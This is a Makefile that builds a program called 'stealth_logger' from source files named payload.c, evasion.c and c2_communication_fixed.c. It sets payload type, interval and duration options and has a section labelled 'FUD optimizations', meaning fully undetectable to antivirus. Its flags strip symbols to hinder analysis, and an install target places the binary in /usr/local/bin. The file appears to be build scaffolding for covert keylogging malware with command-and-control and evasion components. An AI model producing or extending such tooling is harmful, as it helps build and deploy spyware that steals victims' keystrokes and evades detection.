CC = gcc
CFLAGS = -Wall -Wextra -O2 -fPIC -fvisibility=hidden -s -ffunction-sections -fdata-sections -Wl,--gc-sections -Wl,--strip-all
LDFLAGS = -ldl -lpthread

# Payload configuration
PAYLOAD_TYPE ?= 1
PAYLOAD_INTERVAL ?= 60
PAYLOAD_DURATION ?= 300

# FUD optimizations
CFLAGS += -DPAYLOAD_TYPE=$(PAYLOAD_TYPE)
CFLAGS += -DPAYLOAD_INTERVAL=$(PAYLOAD_INTERVAL)
CFLAGS += -DPAYLOAD_DURATION=$(PAYLOAD_DURATION)

# Source files
SRCS = main.c payload.c evasion.c c2_communication_fixed.c
OBJS = $(SRCS:.c=.o)

# Target executable
TARGET = stealth_logger

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

%.o: %.c
	$(CC) $(CFLAGS) -c -o $@ $<

clean:
	rm -f $(TARGET) $(OBJS)

install: $(TARGET)
	cp $(TARGET) /usr/local/bin/

uninstall:
	rm -f /usr/local/bin/$(TARGET)

.PHONY: all clean install uninstall